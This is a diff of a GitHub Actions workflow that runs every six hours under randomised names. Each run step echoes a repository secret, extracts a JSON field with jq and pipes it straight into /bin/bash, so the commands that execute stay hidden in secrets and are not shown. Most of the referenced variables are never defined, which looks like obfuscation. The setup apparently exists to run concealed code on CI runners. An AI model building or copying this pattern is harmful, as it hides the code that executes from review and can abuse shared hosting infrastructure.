@@ -1,8 +1,10 @@
 name: caohong19870101
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
+    - cron: '34 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,23 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          wyd56: ${{ secrets.wyd56 }}
+          cr6: ${{ secrets.cr6 }}
         run: |
-          echo $wyd56 | jq -r .n90 | /bin/bash
-          echo $z32 | jq -r .orvu5636 | /bin/bash
-          echo $xh5 | jq -r .hk1 | /bin/bash
-          echo $edo1 | jq -r .oiv6450 | /bin/bash
-          echo $z13 | jq -r .xohcw48256 | /bin/bash
-          echo $hz48 | jq -r .b633 | /bin/bash
-          echo $mhen54586 | jq -r .jmykc99 | /bin/bash
-          echo $spbm1277 | jq -r .q0 | /bin/bash
-          echo $rx2 | jq -r .useaf19 | /bin/bash
-          echo $a827 | jq -r .mwj17450 | /bin/bash
-          echo $c8624 | jq -r .uk5587 | /bin/bash
-          echo $r34 | jq -r .tzwi4 | /bin/bash
-          echo $x0000 | jq -r .mytg77271 | /bin/bash
-          echo $u7 | jq -r .w8 | /bin/bash
-          echo $twwt38 | jq -r .qsc0 | /bin/bash
-          echo $rb69682 | jq -r .vivgw4 | /bin/bash
-          echo $vw1821 | jq -r .ougz86 | /bin/bash
+          echo $cr6 | jq -r .rexeq510 | /bin/bash
+          echo $oiypi612 | jq -r .hdqu798 | /bin/bash
+          echo $ge32790 | jq -r .qcq1282 | /bin/bash
+          echo $axwp19945 | jq -r .qrz51 | /bin/bash
+          echo $fmzd24 | jq -r .opp012 | /bin/bash
+          echo $yakfe85 | jq -r .q5 | /bin/bash
+          echo $m97486 | jq -r .td15065 | /bin/bash
+          echo $tkl229 | jq -r .rxnk25809 | /bin/bash
+          echo $wsgak531 | jq -r .kl78506 | /bin/bash
+          echo $gkeos04 | jq -r .jhgir71926 | /bin/bash
+          echo $a0286 | jq -r .tk8 | /bin/bash
 
